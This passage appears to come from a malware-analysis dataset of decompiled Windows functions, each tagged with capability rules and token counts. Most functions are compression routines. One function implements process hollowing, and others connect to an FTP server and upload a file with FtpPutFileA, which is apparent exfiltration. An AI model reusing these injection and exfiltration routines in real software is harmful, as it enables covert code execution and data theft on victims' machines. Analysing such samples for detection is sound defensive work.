*(in_EAX + 0x16b4) | *(param_1 + uVar7 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar7 * 4 + 0x4a3754);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar7 * 4 + 0x4a3d84);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n            }\n        } while (uStack32 < *(in_EAX + 0x169c));\n    }\n    uVar7 = *(param_2 + 0x402);\n    if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n        uVar2 = *(param_2 + 0x400);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + 0x400) << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n    }\n    *(in_EAX + 0x16b0) = *(param_2 + 0x402);\n    return;\n}\n",
        "token_count": 2972
    },
    "0044bd80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044bd80(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    piVar1 = in_EAX + 0x24;\n    do {\n        if (*piVar1 != 0) break;\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 9);\n    if (iVar2 == 9) {\n        iVar2 = 0xe;\n        piVar1 = in_EAX + 0x32;\n        do {\n            if (*piVar1 != 0) break;\n            iVar2 = iVar2 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar2 < 0x20);\n    }\n    *(*in_EAX + 0x2c) = iVar2 == 0x20;\n    return;\n}\n",
        "token_count": 214
    },
    "0044be5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044be5c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) < 9) {\n        if (0 < *(in_EAX + 0x16b8)) {\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        }\n    }\n    else {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n    }\n    *(in_EAX + 0x16b4) = 0;\n    *(in_EAX + 0x16b8) = 0;\n    return;\n}\n",
        "token_count": 318
    },
    "0044bec4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bec4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uchar *in_EDX;\n    \n    fcn.0044be5c();\n    *(in_EAX + 0x16b0) = 8;\n    if (arg_8h != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX >> 8;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX >> 8;\n    }\n    while (in_ECX != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *in_EDX;\n        in_EDX = in_EDX + 1;\n        in_ECX = in_ECX + -1;\n    }\n    return;\n}\n",
        "token_count": 437
    },
    "0044c904": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044c904(void)\n\n{\n    if (*0x4aad94 == 0) {\n        *0x4aad94 = sub.kernel32.dll_LoadLibraryA(0x44cad0);\n        if (*0x4aad94 < 0x20) {\n            *0x4aad94 = 0;\n            return 0;\n        }\n        *0x4aad98 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cadc);\n        *0x4aad9c = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44caec);\n        *0x4aada0 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb00);\n        *0x4aada4 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb14);\n        *0x4aada8 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb00);\n        *0x4aadac = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb14);\n        *0x4aadb0 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb2c);\n        *0x4aadb4 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb40);\n        *0x4aadb8 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb58);\n        *0x4aadbc = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb70);\n        *0x4aadc0 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb80);\n        *0x4aadc4 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cb90);\n        *0x4aadc8 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cbac);\n        *0x4aadcc = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cbc0);\n        *0x4aadd0 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cbdc);\n        *0x4aadd4 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cbac);\n        *0x4aadd8 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cbc0);\n        *0x4aaddc = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cbdc);\n        *0x4aade0 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cbf8);\n        *0x4aade4 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cc0c);\n        *0x4aade8 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cc28);\n        *0x4aadec = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cc44);\n        *0x4aadf0 = sub.kernel32.dll_GetProcAddress_1(*0x4aad94, 0x44cc58);\n    }\n    return 1;\n}\n",
        "token_count": 799
    },
    "0044ccc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044ccc4(void)\n\n{\n    if (*0x4aadf4 == 0) {\n        *0x4aadf4 = sub.kernel32.dll_GetModuleHandleA_2(0x44ce20);\n        if (*0x4aadf4 != 0) {\n            *0x4aadf8 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ce30);\n            *0x4aadfc = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ce4c);\n            *0x4aae00 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ce5c);\n            *0x4aae04 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ce6c);\n            *0x4aae08 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ce78);\n            *0x4aae0c = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ce84);\n            *0x4aae10 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cea0);\n            *0x4aae14 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ceb0);\n            *0x4aae18 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cec0);\n            *0x4aae1c = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44ced0);\n            *0x4aae20 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cee0);\n            *0x4aae24 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cef0);\n            *0x4aae28 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cf00);\n            *0x4aae2c = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cf10);\n            *0x4aae30 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cf20);\n            *0x4aae34 = sub.kernel32.dll_GetProcAddress_1(*0x4aadf4, 0x44cf30);\n        }\n    }\n    if ((*0x4aadf4 != 0) && (*0x4aadf8 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 626
    },
    "0044d45c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d45c(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    if (*(arg_ch + 0xa4) != 0) {\n        for (var_ch = *(arg_ch + 0xa0) + arg_8h; *var_ch != 0; var_ch = var_ch[1] + var_ch) {\n            iVar1 = *var_ch;\n            piVar4 = var_ch + 2;\n            iVar2 = fcn.0040344c();\n            do {\n                if (*piVar4 >> 0xc == 3) {\n                    piVar3 = iVar1 + arg_8h + (*piVar4 & 0xfff);\n                    *piVar3 = *piVar3 + arg_10h;\n                }\n                piVar4 = piVar4 + 2;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "0044d5a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d5a0(void)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0xd0, 0x1000, 4);\n    *in_EAX = uVar1;\n    uVar1 = *in_EAX;\n    if (*in_EAX != 0) {\n        for (; (uVar1 & 3) != 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0044d5d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d5d4(int16_t *param_1, uchar *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    uchar *in_stack_ffffff60;\n    int32_t iStack144;\n    uint *puStack140;\n    uchar *puStack136;\n    uint *var_74h;\n    uchar *puStack116;\n    int32_t iStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint *puStack100;\n    uchar *hProcess;\n    int32_t hThread;\n    uint lpNumberOfBytesWritten;\n    int32_t lpBaseAddress;\n    int32_t lpBuffer;\n    uchar *lpAddress;\n    uint *lpContext;\n    int32_t var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    puStack136 = 0x44d5ed;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack136 = 0x44d5f5;\n    fcn.004058ec();\n    puStack140 = 0x44d83c;\n    iStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    puStack136 = &stack0xfffffffc;\n    if (var_8h != NULL) {\n        in_stack_ffffff60 = var_8h;\n        puStack136 = &stack0xfffffffc;\n        fcn.00405800(var_8h, 0x44d864, var_4h, 0x44d858);\n    }\n    var_ch = 0;\n    if ((*param_1 == 0x5a4d) && (arg_ch = param_1 + *(param_1 + 0x1e),  *arg_ch == 0x4550)) {\n        fcn.00403ae4();\n        fcn.00403ae4();\n        var_74h = 0x44;\n        puVar3 = &fcn.0044d5d4::var_74h;\n        uVar1 = fcn.004058fc(0, 0, 0, 4, 0, 0, puVar3, &fcn.0044d5d4::hProcess);\n        uVar1 = fcn.004058fc(uVar1);\n        iVar2 = sub.kernel32.dll_CreateProcessA(uVar1);\n        if (iVar2 != 0) {\n            lpContext = fcn.0044d5a0();\n            if (lpContext != NULL) {\n                *lpContext = 0x10007;\n                iVar2 = sub.kernel32.dll_GetThreadContext(hThread, lpContext);\n                if (iVar2 != 0) {\n                    sub.kernel32.dll_ReadProcessMemory\n                              (hProcess, lpContext[0x29] + 8, &fcn.0044d5d4::lpBuffer, 4, \n                               &fcn.0044d5d4::lpNumberOfBytesWritten);\n                    if (arg_ch[0xd] == lpBuffer) {\n                        iVar2 = sub.ntdll_NtUnmapViewOfSection(hProcess, arg_ch[0xd]);\n                        if (iVar2 == 0) {\n                            lpBaseAddress =\n                                 sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                        }\n                        else {\n                            lpBaseAddress = sub.kernel32.dll_VirtualAllocEx(hProcess, 0, arg_ch[0x14], 0x3000, 0x40);\n                        }\n                    }\n                    else {\n                        lpBaseAddress =\n                             sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                    }\n                    if (lpBaseAddress != 0) {\n                        uStack108 = fcn.0044d514();\n                        if (arg_ch[0xd] != lpBaseAddress) {\n                            fcn.0044d45c(uStack108, arg_ch, lpBaseAddress - arg_ch[0xd]);\n                            arg_ch[0xd] = lpBaseAddress;\n                            fcn.00408460();\n                        }\n                        puStack100 = &fcn.0044d5d4::lpNumberOfBytesWritten;\n                        iStack104 = arg_ch[0x14];\n                        iStack112 = lpBaseAddress;\n                        puStack116 = hProcess;\n                        var_74h = 0x44d7b5;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        var_74h = &fcn.0044d5d4::lpNumberOfBytesWritten;\n                        puStack136 = hProcess;\n                        puStack140 = 0x44d7d5;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        lpContext[0x2c] = arg_ch[10] + lpBaseAddress;\n                        puStack140 = lpContext;\n                        iStack144 = hThread;\n                        sub.kernel32.dll_SetThreadContext();\n                        sub.kernel32.dll_ResumeThread(hThread);\n                        var_ch = hThread;\n                    }\n                }\n                sub.kernel32.dll_VirtualFree_1(lpAddress, 0, 0x8000);\n                in_stack_ffffff60 = lpAddress;\n            }\n            if (var_ch == 0) {\n                sub.kernel32.dll_TerminateProcess(puVar3, 0);\n                in_stack_ffffff60 = hProcess;\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405490(0x44d843);\n    return;\n}\n",
        "token_count": 1266
    },
    "0044d8a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d8a8(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x44d8c0;\n    fcn.004058ec();\n    puStack24 = 0x44d8c8;\n    fcn.004058ec();\n    puStack24 = 0x44d8d0;\n    fcn.004058ec();\n    puStack24 = 0x44d8d8;\n    fcn.004058ec();\n    uStack28 = 0x44d982;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    *0x4aae44 = sub.wininet.dll_InternetOpenA(0x44d994, 0, 0, 0, 0);\n    if (*0x4aae44 != 0) {\n        uVar1 = fcn.004058fc(1, 0, 0);\n        uVar1 = fcn.004058fc(uVar1);\n        uVar1 = fcn.00409dd8(uVar1);\n        uVar1 = fcn.004058fc(uVar1);\n        in_stack_ffffffac = *0x4aae44;\n        *0x4aae40 = sub.wininet.dll_InternetConnectA(*0x4aae44, uVar1);\n        if (*0x4aae40 != 0) {\n            *0x4a4164 = 1;\n            goto code_r0x0044d95f;\n        }\n    }\n    *0x4a4164 = 0;\ncode_r0x0044d95f:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405490(0x44d989);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 483
    },
    "0044d99c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d99c(void)\n\n{\n    if (*0x4a4164 != '\\0') {\n        sub.wininet.dll_InternetCloseHandle(*0x4aae44);\n        sub.wininet.dll_InternetCloseHandle(*0x4aae40);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0044d9bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d9bc(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x44d9d1;\n    fcn.004058ec();\n    puStack20 = 0x44d9d9;\n    fcn.004058ec();\n    uStack24 = 0x44da34;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x4a4164 != '\\0') {\n        puStack20 = &stack0xfffffffc;\n        uVar1 = fcn.004058fc(2, 0);\n        uVar1 = fcn.004058fc(uVar1);\n        in_stack_ffffffd0 = *0x4aae40;\n        sub.wininet.dll_FtpPutFileA(*0x4aae40, uVar1);\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405490(0x44da3b);\n    return;\n}\n",
        "token_count": 288
    },
    "0044ec34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044ed13)\n\nvoid __fastcall fcn.0044ec34(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x44ed51;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        puStack56 = 0x44ec72;\n        fcn.004054c0();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    if (-1 < *(*(in_EAX + 0x10) + 8) + -1) {\n        puStack56 = 0x44ec9d;\n        fcn.00419610();\n        puStack56 = 0x44eca8;\n        fcn.00406f54();\n        uStack60 = 0x44ed20;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        fcn.00406f3c();\n        cVar2 = fcn.0040f850();\n        if (cVar2 != '\\0') {\n            (**(_pe_dos_header + 0x40))();\n            (**(_pe_dos_header + 0x44))();\n        }\n        iVar3 = (**(_pe_dos_header + 0x10))();\n        if (iVar3 < 1) {\n            *in_FS_OFFSET = uStack52;\n            return;\n        }\n        puStack56 = 0x44ecfe;\n        fcn.00404f60();\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x44ed58;\n    uStack48 = 0x44ed48;\n    fcn.00406f3c();\n    uStack48 = 0x44ed50;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 569
    },
    "0044e460": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044e460(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY112;\n    uint uStackY108;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint in_stack_ffffffa0;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x44e6f7;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puVar1 = &stack0xfffffffc;\n    var_ch = param_2;\n    var_8h = in_EAX;\n    if (param_1 != 0) {\n        puStack80 = 0x44e498;\n        fcn.004054c0();\n        puVar1 = puStack68;\n    }\n    puStack68 = puVar1;\n    if (0 < *(*(var_8h + 0x10) + 8)) {\n        puStack80 = 0x44e4b4;\n        var_20h = fcn.00404610();\n        uStack84 = 0x44e6d2;\n        uStack88 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa8;\n        iVar2 = *(*(var_8h + 0x10) + 8);\n        puStack80 = &stack0xfffffffc;\n        if (-1 < iVar2 + -1) {\n            var_10h = 0;\n            puStack80 = &stack0xfffffffc;\n            var_24h = iVar2;\n            do {\n                iVar2 = fcn.00419610();\n                iVar2 = (**(**(iVar2 + 4) + 0x10))();\n                if (0 < iVar2) {\n                    fcn.004194b8();\n                }\n                var_10h = var_10h + 1;\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n        if (*(var_20h + 8) == 0) {\n            var_2ch = fcn.004058fc();\n            var_28h._0_1_ = 6;\n            in_stack_ffffffa0 = 0;\n            uStackY100 = 0x44e53f;\n            fcn.0040daf0(0, &fcn.0044e460::var_2ch);\n            uStackY100 = 0x44e544;\n            fcn.00404eb4();\n        }\n        else {\n            if (*(var_20h + 8) != 1) {\n                var_18h = fcn.00404610();\n                uStackY100 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff9c;\n                if (-1 < *(var_20h + 8) + -1) {\n                    var_10h = 0;\n                    var_24h = *(var_20h + 8);\n                    do {\n                        puStackY104 = 0x44e5a8;\n                        iVar2 = fcn.00419610();\n                        puStackY104 = 0x44e5b5;\n                        var_1ch = (**(**(iVar2 + 4) + 0x14))();\n                        if (var_1ch != NULL) {\n                            uStackY108 = 0x44e61a;\n                            uStackY112 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffff90;\n                            puStackY104 = &stack0xfffffffc;\n                            iVar2 = (**(*var_1ch + 0x14))();\n                            if (-1 < iVar2 + -1) {\n                                var_14h = 0;\n                                do {\n                                    (**(*var_1ch + 0xc))();\n                                    (**(*var_18h + 0x3c))();\n                                    var_14h = var_14h + 1;\n                                    iVar2 = iVar2 + -1;\n                                } while (iVar2 != 0);\n                            }\n                            *in_FS_OFFSET = uStackY112;\n                            puStackY104 = 0x44e621;\n                            uStackY108 = 0x44e619;\n                            fcn.00404640();\n                            return;\n                        }\n                        var_10h = var_10h + 1;\n                        var_24h = var_24h + -1;\n                    } while (var_24h != 0);\n                }\n                if (*(var_8h + 0xc) == 0) {\n                    puStackY104 = 0x44e685;\n                    iVar2 = (**(*var_18h + 0x18))();\n                    puStackY104 = 0x44e694;\n                    (**(*var_18h + 0xc))();\n                    puStackY104 = 0x44e69f;\n                    (**(**(iVar2 + 4) + 0x20))();\n                }\n                else {\n                    puStackY104 = 0x44e641;\n                    (**(*var_18h + 0x90))();\n                    puStackY104 = 0x44e64f;\n                    iVar2 = (**(**(var_8h + 0xc) + 0xc))();\n                    if (-1 < iVar2) {\n                        puStackY104 = 0x44e65f;\n                        iVar2 = (**(*var_18h + 0x18))();\n                        puStackY104 = 0x44e66e;\n                        (**(*var_18h + 0xc))();\n                        puStackY104 = 0x44e679;\n                        (**(**(iVar2 + 4) + 0x20))();\n                    }\n                }\n                *in_FS_OFFSET = uStackY100;\n                fcn.00404640();\n                return;\n            }\n            iVar2 = fcn.00419610();\n            (**(**(iVar2 + 4) + 0x20))();\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        uStack88 = 0x44e6d9;\n        fcn.00404640();\n        return;\n    }\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x44e6fe;\n    uStack72 = 0x44e6ee;\n    fcn.0040546c();\n    uStack72 = 0x44e6f6;\n    fcn.0040546c();\n    return;\n}\n",
